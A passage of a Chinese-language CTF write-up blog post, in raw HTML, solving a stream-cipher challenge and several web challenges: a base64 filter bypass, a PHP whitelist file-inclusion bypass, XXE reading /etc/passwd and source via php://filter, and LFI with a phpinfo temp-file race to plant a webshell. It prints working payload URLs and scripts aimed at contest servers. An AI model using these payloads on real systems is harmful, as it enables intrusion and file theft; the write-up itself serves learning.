stream([1,0,0,1,1,0,1,0,0,1],len(plain))</span><br></pre></td></tr></tbody></table></figure></div><h3 id="得到a-1-0-0-1-0"><a href="#得到a-1-0-0-1-0" class="headerlink" title="得到a=[1, 0, 0, 1, 0]"></a>得到a=[1, 0, 0, 1, 0]</h3><h3 id="然后根据加密脚本，获得key。然后key与密文异或得到flag"><a href="#然后根据加密脚本，获得key。然后key与密文异或得到flag" class="headerlink" title="然后根据加密脚本，获得key。然后key与密文异或得到flag"></a>然后根据加密脚本，获得key。然后key与密文异或得到flag</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def stream(init,size):</span><br><span class="line">    if len(init) < 5:</span><br><span class="line">        return init</span><br><span class="line">    result = init[:5]</span><br><span class="line">    for index in range(size-5):</span><br><span class="line">        mid = (result[index] * a[0]) ^ (result[index + 1] * a[1]) ^ (result[index + 2] * a[2]) ^ (result[index + 3] * a[3]) ^ (result[index+4] * a[4])</span><br><span class="line">        result.append(mid)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">if __name__ == '__main__':</span><br><span class="line">    a=[1, 0, 0, 1, 0]</span><br><span class="line">    cipher = '111111000010111011011010011110000100111111010110000000100100110000001100011010111000000100100011100100010111110010101000100100011100000101011001111011101001101000111011000010000000011010000111111000111101011110111010'</span><br><span class="line">    flag=''</span><br><span class="line">    key = stream([1,0,0,1,1,0,1,0,0,1],len(cipher))</span><br><span class="line">    for i in range(len(cipher)):</span><br><span class="line">        flag += str(int(cipher[i]) ^ key[i])</span><br><span class="line">    for i in range(0,len(flag),8):</span><br><span class="line">        print(chr(int(flag[i:i+8],2)),end="")</span><br></pre></td></tr></tbody></table></figure></div><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="0x1-base-1"><a href="#0x1-base-1" class="headerlink" title="0x1 base_1"></a>0x1 base_1</h2><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/13.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/13.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn</span><br><span class="line">得到回显 </span><br><span class="line">不能输入bXlmbGFn！</span><br><span class="line">但经过测试，发现被加密后的base64字符串解密时似乎会舍弃密文末尾多余的字符（取余4后多出来的字符），于是这题就不难绕过了，</span><br><span class="line">最终payload：</span><br><span class="line">http://45.76.51.219:8050/?base=bXlmbGFn1</span><br><span class="line">得到flag</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x2-truncation"><a href="#0x2-truncation" class="headerlink" title="0x2 truncation"></a>0x2 truncation</h2><h3 id="进入网站，f12，发现注释："><a href="#进入网站，f12，发现注释：" class="headerlink" title="进入网站，f12，发现注释："></a>进入网站，f12，发现注释：</h3><h3 id="进入sorce-php发现源码："><a href="#进入sorce-php发现源码：" class="headerlink" title="进入sorce.php发现源码："></a>进入sorce.php发现源码：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><!--?php</span--><br><span class="line">class kind</span><br><span class="line">{</span><br><span class="line">public static function checkFile(&$page)</span><br><span class="line">{</span><br><span class="line">        $whitelist = ["source"=>"source.php","aa"=>"aa.php"];</span><br><span class="line"></span><br><span class="line">        if (! isset($page) || !is_string($page)) {</span><br><span class="line">        echo "you can't see it";</span><br><span class="line">        return false;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) {</span><br><span class="line">        return true;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . '?', '?')</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (in_array($_page, $whitelist)) {</span><br><span class="line">        return true;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . '?', '?')</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) {</span><br><span class="line">        return true;</span><br><span class="line">        }</span><br><span class="line">        echo "you can't see it";</span><br><span class="line">        return false;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST['file'])</span><br><span class="line">        && is_string($_REQUEST['file'])</span><br><span class="line">        && kind::checkFile($_REQUEST['file'])</span><br><span class="line">    ) {</span><br><span class="line">        include $_REQUEST['file'];</span><br><span class="line">        exit;</span><br><span class="line">    } else {</span><br><span class="line">       echo "<h>Look carefully and you will find the answer.</h><br>";</span><br><span class="line">    }  </span><br><span class="line">?></span><br></span></pre></td></tr></tbody></table></figure></div><h3 id="先进入click-php，发现：flag-is-not-here-and-flag-in-flag-php-得到了ﬂag的位置，那么应该是考任意文件包含漏洞"><a href="#先进入click-php，发现：flag-is-not-here-and-flag-in-flag-php-得到了ﬂag的位置，那么应该是考任意文件包含漏洞" class="headerlink" title="先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞"></a>先进入click.php，发现：flag is not here, and flag in flag.php 得到了ﬂag的位置，那么应该是考任意文件包含漏洞</h3><h3 id="审计代码得到："><a href="#审计代码得到：" class="headerlink" title="审计代码得到："></a>审计代码得到：</h3><h3 id="要设定page的值，且内容要在whiteList中"><a href="#要设定page的值，且内容要在whiteList中" class="headerlink" title="要设定page的值，且内容要在whiteList中"></a>要设定page的值，且内容要在whiteList中</h3><h3 id="mb-substr-page-0-mb-strpos-page-’-’-’-’"><a href="#mb-substr-page-0-mb-strpos-page-’-’-’-’" class="headerlink" title="mb_substr($page,0,mb_strpos($page.’?’,’?’))"></a>mb_substr($page,0,mb_strpos($page.’?’,’?’))</h3><h3 id="表示截取page中？之前的内容-接着对-page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串-且-checkﬁle返回真值-就能包含文件ﬁle"><a href="#表示截取page中？之前的内容-接着对-page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串-且-checkﬁle返回真值-就能包含文件ﬁle" class="headerlink" title="表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle"></a>表示截取page中？之前的内容 接着对$page进行一次URLdecode之后，再判断一次。最后ﬁle的值为一个字符串 且 checkﬁle返回真值 就能包含文件ﬁle</h3><h3 id="所以最终payload："><a href="#所以最终payload：" class="headerlink" title="所以最终payload："></a>所以最终payload：</h3><h3 id="http-47-110-227-208-8003-index-php-file-source-php-flag-php"><a href="#http-47-110-227-208-8003-index-php-file-source-php-flag-php" class="headerlink" title="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"></a><a href="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php" target="_blank" rel="noopener">http://47.110.227.208:8003/index.php?file=source.php?../../flag.php</a></h3><h3 id="得到一个猜密码的界面"><a href="#得到一个猜密码的界面" class="headerlink" title="得到一个猜密码的界面"></a>得到一个猜密码的界面</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><title>猜密码</title></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><!-- </span><br><span class="line">session_start();</span><br><span class="line">$_SESSION['pwd']=time();</span><br><span class="line">if (isset ($_POST['password'])) {</span><br><span class="line">        if ($_POST['pwd'] == $_SESSION['pwd'])</span><br><span class="line">                die('Flag:'.$flag);</span><br><span class="line">        else{</span><br><span class="line">                print '<p>猜测错误.</p>';</span><br><span class="line">                $_SESSION['pwd']=time().time();</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line">--></span><br><span class="line"><form action="index.php" method="post"><br><span class="line">密码：<input type="text" name="pwd"></span><br><span class="line"><input type="submit" value="猜密码"></span><br><span class="line"></span></form><br><span class="line"></span><br><span class="line"></span><br></span></pre></td></tr></tbody></table></figure></div><h3 id="需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下"><a href="#需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下" class="headerlink" title="需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下"></a>需要post一个赋值了的password和一个和服务器时间的值相同的pwd，脚本如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">from bs4 import BeautifulSoup       #html解析器</span><br><span class="line">url="http://47.110.227.208:8003/index.php?file=source.php?../../flag.php"    #目标url</span><br><span class="line"></span><br><span class="line">session=requests.session()          #获取一个session对象</span><br><span class="line">response=session.get(url)</span><br><span class="line">html=response.text                  #返回的页面</span><br><span class="line">soup=BeautifulSoup(html,'html.parser')</span><br><span class="line"></span><br><span class="line">formData={"password":"123","pwd":"int(time.time())"}#构建一个formData，用于传我们的</span><br><span class="line">re2=session.post(url,data=formData)#post过去</span><br><span class="line"></span><br><span class="line">if("猜测错误" not  in re2.text):</span><br><span class="line">print(re2.text)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是-SESSION-‘pwd’-time-没有执行成功。"><a href="#发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是-SESSION-‘pwd’-time-没有执行成功。" class="headerlink" title="发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是$_SESSION[‘pwd’]=time();没有执行成功。"></a>发现无法获得flag，后来发现pwd赋值为空可以获得flag，可能是$_SESSION[‘pwd’]=time();没有执行成功。</h3><h2 id="0x3-Simple-XXE"><a href="#0x3-Simple-XXE" class="headerlink" title="0x3 Simple XXE"></a>0x3 Simple XXE</h2><h3 id="首先，了解一下XXE，（xml外部实体注入漏洞）"><a href="#首先，了解一下XXE，（xml外部实体注入漏洞）" class="headerlink" title="首先，了解一下XXE，（xml外部实体注入漏洞）"></a>首先，了解一下XXE，（xml外部实体注入漏洞）</h3><h3 id="参考文章：https-www-cnblogs-com-cui0x01-p-8823690-html"><a href="#参考文章：https-www-cnblogs-com-cui0x01-p-8823690-html" class="headerlink" title="参考文章：https://www.cnblogs.com/cui0x01/p/8823690.html"></a>参考文章：<a href="https://www.cnblogs.com/cui0x01/p/8823690.html" target="_blank" rel="noopener">https://www.cnblogs.com/cui0x01/p/8823690.html</a></h3><h3 id="（然后跟这个文章走2333）"><a href="#（然后跟这个文章走2333）" class="headerlink" title="（然后跟这个文章走2333）"></a>（然后跟这个文章走2333）</h3><h3 id="首先f12看到dom-php存在XXE，于是构造XML文本先验证漏洞，"><a href="#首先f12看到dom-php存在XXE，于是构造XML文本先验证漏洞，" class="headerlink" title="首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，"></a>首先f12看到dom.php存在XXE，于是构造XML文本先验证漏洞，</h3><h3 id="这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中SYSTEM-“file-etc-passwd”部分引用了目标服务器-即172-16-12-2-下的-etc-passwd文件，服务器解析XML内容后，会将这一文件内容存入-amp-xxe中，然后将数据返回给恶意访问者。"><a href="#这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中SYSTEM-“file-etc-passwd”部分引用了目标服务器-即172-16-12-2-下的-etc-passwd文件，服务器解析XML内容后，会将这一文件内容存入-amp-xxe中，然后将数据返回给恶意访问者。" class="headerlink" title="这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中SYSTEM “file:///etc/passwd”部分引用了目标服务器(即172.16.12.2)下的/etc/passwd文件，服务器解析XML内容后，会将这一文件内容存入&xxe中，然后将数据返回给恶意访问者。"></a>这一步骤将XML内容发送给服务器，当服务器将XML解析完成后，就会依照解析的内容工作，这段XML中SYSTEM “file:///etc/passwd”部分引用了目标服务器(即172.16.12.2)下的/etc/passwd文件，服务器解析XML内容后，会将这一文件内容存入&xxe中，然后将数据返回给恶意访问者。</h3><h3 id="执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上-etc-passwd文件的内容"><a href="#执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上-etc-passwd文件的内容" class="headerlink" title="执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上/etc/passwd文件的内容"></a>执行完成上面的操作后，点击GO，右侧将出现此数据包的返回结果，内容如下，返回的数据为服务器上/etc/passwd文件的内容</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/14.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/14.png" class="lazyload"></a></p><h3 id="漏洞验证成功"><a href="#漏洞验证成功" class="headerlink" title="漏洞验证成功"></a>漏洞验证成功</h3><h3 id="于是修改XML中的外部实体为其他协议，根据提示看hint，php-filter-read-convert-base64-encode-resource-hint-php，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果"><a href="#于是修改XML中的外部实体为其他协议，根据提示看hint，php-filter-read-convert-base64-encode-resource-hint-php，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果" class="headerlink" title="于是修改XML中的外部实体为其他协议，根据提示看hint，php://filter/read=convert.base64-encode/resource=hint.php，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果"></a>于是修改XML中的外部实体为其他协议，根据提示看hint，php://filter/read=convert.base64-encode/resource=hint.php，在Proxy选项卡的原数据包中粘贴XML内容，点击FORWARD放行请求，返回的结果</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/15.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/15.png" class="lazyload"></a></p><h3 id="解码后得到目录，"><a href="#解码后得到目录，" class="headerlink" title="解码后得到目录，"></a>解码后得到目录，</h3><h3 id="于是"><a href="#于是" class="headerlink" title="于是"></a>于是</h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/16.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/16.png" class="lazyload"></a></p><h3 id="解码得到flag"><a href="#解码得到flag" class="headerlink" title="解码得到flag"></a>解码得到flag</h3><h2 id="0x4-inclusion"><a href="#0x4-inclusion" class="headerlink" title="0x4 inclusion"></a>0x4 inclusion</h2><h3 id="进入页面，f12，发现注释-phpinfo-php"><a href="#进入页面，f12，发现注释-phpinfo-php" class="headerlink" title="进入页面，f12，发现注释 phpinfo.php"></a>进入页面，f12，发现注释 phpinfo.php</h3><h3 id="然后根据名字，猜测是php文件包含漏洞（利用phpinfo）"><a href="#然后根据名字，猜测是php文件包含漏洞（利用phpinfo）" class="headerlink" title="然后根据名字，猜测是php文件包含漏洞（利用phpinfo）"></a>然后根据名字，猜测是php文件包含漏洞（利用phpinfo）</h3><h3 id="参考这篇文章（又是跟着文章走）https-www-cnblogs-com-xiaoqiyue-p-10158702-html"><a href="#参考这篇文章（又是跟着文章走）https-www-cnblogs-com-xiaoqiyue-p-10158702-html" class="headerlink" title="参考这篇文章（又是跟着文章走）https://www.cnblogs.com/xiaoqiyue/p/10158702.html"></a>参考这篇文章（又是跟着文章走）<a href="https://www.cnblogs.com/xiaoqiyue/p/10158702.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoqiyue/p/10158702.html</a></h3><h3 id="访问http-47-110-227-208-8001-lfi-php-file-etc-passwd验证漏洞"><a href="#访问http-47-110-227-208-8001-lfi-php-file-etc-passwd验证漏洞" class="headerlink" title="访问http://47.110.227.208:8001/lfi.php?file=/etc/passwd验证漏洞"></a>访问<a href="http://47.110.227.208:8001/lfi.php?file=/etc/passwd验证漏洞" target="_blank" rel="noopener">http://47.110.227.208:8001/lfi.php?file=/etc/passwd验证漏洞</a></h3><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/17.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/17.png" class="lazyload"></a></p><h3 id="成功。"><a href="#成功。" class="headerlink" title="成功。"></a>成功。</h3><h3 id="文章如是说："><a href="#文章如是说：" class="headerlink" title="文章如是说："></a>文章如是说：</h3><h3 id="先讲一下利用phpinfo上传文件，然后在文件包含的原理："><a href="#先讲一下利用phpinfo上传文件，然后在文件包含的原理：" class="headerlink" title="先讲一下利用phpinfo上传文件，然后在文件包含的原理："></a>先讲一下利用phpinfo上传文件，然后在文件包含的原理：</h3><h3 id="参考链接：https-github-com-vulhub-vulhub-tree-master-php-inclusion"><a href="#参考链接：https-github-com-vulhub-vulhub-tree-master-php-inclusion" class="headerlink" title="参考链接：https://github.com/vulhub/vulhub/tree/master/php/inclusion"></a>参考链接：<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></h3><h3 id="在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是-tmp-php-6个随机字符-），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。"><a href="#在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是-tmp-php-6个随机字符-），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。" class="headerlink" title="在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。"></a>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。</h3><h3 id="因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。"><a href="#因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。" class="headerlink" title="因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。"></a>因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。</h3><h3 id="但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含："><a href="#但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：" class="headerlink" title="但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含："></a>但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：</h3><h3 id="1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；"><a href="#1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；" class="headerlink" title="1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；"></a>1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；</h3><h3 id="2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大"><a href="#2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大" class="headerlink" title="2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大"></a>2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大</h3><h3 id="3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接"><a href="#3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接" class="headerlink" title="3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接"></a>3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接</h3><h3 id="4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包"><a href="#4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包" class="headerlink" title="4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包"></a>4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包</h3><h3 id="5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除"><a href="#5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除" class="headerlink" title="5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除"></a>5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除</h3><h3 id="6）我们可以利用这个时间差，成功包含临时文件，最后getshell"><a href="#6）我们可以利用这个时间差，成功包含临时文件，最后getshell" class="headerlink" title="6）我们可以利用这个时间差，成功包含临时文件，最后getshell"></a>6）我们可以利用这个时间差，成功包含临时文件，最后getshell</h3><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 